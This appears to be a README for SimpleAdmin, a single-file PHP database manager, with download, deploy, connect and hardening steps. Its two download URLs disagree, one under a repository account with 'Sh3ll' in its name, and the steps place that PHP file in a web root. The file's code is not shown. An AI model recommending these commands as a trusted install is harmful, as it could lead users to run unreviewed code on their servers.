## вңҰ What is SimpleAdmin?

SimpleAdmin is a **zero-dependency, single-file** PHP database manager вҖ” think Adminer, but stripped to the essentials with a dark terminal-inspired UI. No Composer, no npm, no framework. Upload one file and you have a full-featured database management panel.

```
wget https://raw.githubusercontent.com/youruser/simpleadmin/main/adminer.php
```

> Place it on your server. Open in browser. Done.

### Database Management
| Feature | Description |

## рҹҡҖ Quick Start

### 1. Download

```bash
# via wget
wget https://raw.githubusercontent.com/AsaKinSh3ll/NEW-ADMINER-2025/refs/heads/main/adminer.php

# or curl
curl -O https://raw.githubusercontent.com/AsaKinSh3ll/NEW-ADMINER-2025/refs/heads/main/adminer.php
```

### 2. Deploy

```bash
# Apache / Nginx вҖ” copy to web root
cp adminer.php /var/www/html/adminer.php

# XAMPP
cp adminer.php C:/xampp/htdocs/adminer.php

# Laragon
cp adminer.php C:/laragon/www/adminer.php

# PHP built-in server (local dev)
php -S localhost:8080
```

### 3. Open

```
http://localhost/adminer.php
http://localhost:8080/adminer.php
```

### 4. Connect

Fill in your credentials and hit **Connect вҶ’**

```
Host:     localhost
Port:     3306
Username: root
Password: вҖўвҖўвҖўвҖўвҖўвҖўвҖўвҖў
Database: (optional вҖ” leave blank to browse all)
```

## рҹ”’ Security

> вҡ пёҸ **SimpleAdmin is a developer tool. Do not expose it on public-facing production servers.**

### Recommended practices

**Protect with HTTP Basic Auth (Apache)**
```apache
# .htaccess вҖ” same directory as adminer.php
AuthType Basic
AuthName "Restricted"
AuthUserFile /path/to/.htpasswd
Require valid-user
```

**Restrict by IP (Nginx)**
```nginx
location /adminer.php {
    allow 127.0.0.1;
    allow YOUR.IP.ADDRESS.HERE;
    deny all;
}
```

**Remove after use**
```bash
# Best practice on production: delete when not needed
rm /var/www/html/adminer.php
```

**Use a non-obvious filename**
```bash
mv adminer.php db_panel_xK92m.php
```

### What SimpleAdmin does NOT do
- вқҢ Store credentials server-side (sessions only, cleared on disconnect)
- вқҢ Log queries
- вқҢ Execute shell commands
- вқҢ Access the filesystem


## рҹ”§ Customization

SimpleAdmin is intentionally minimal вҖ” but easy to extend. All logic and UI live in one file.

**Change rows per page:**
```php
// Line ~30 in adminer.php
$perPage = 50;  // вҶҗ change this
```

**Change default host/port:**
```php
// In the login form HTML
<input ... name="host" value="localhost">   // вҶҗ change default host
<input ... name="port" value="3306">        // вҶҗ change default port
```
